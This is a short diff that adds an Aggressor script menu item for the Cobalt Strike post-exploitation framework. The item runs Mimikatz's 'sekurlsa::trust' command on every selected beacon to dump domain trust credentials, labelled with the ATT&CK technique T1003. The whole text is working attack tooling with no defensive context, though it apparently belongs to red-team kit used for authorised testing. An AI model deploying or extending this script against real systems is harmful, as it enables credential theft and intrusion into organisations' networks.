@@ -1,0 +1,13 @@
+item "Mimikatz Dump Trust  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					trust($bid);
+				}
+			}
+
+
+sub trust{
+
+bmimikatz($1, "sekurlsa::trust");
+
+}
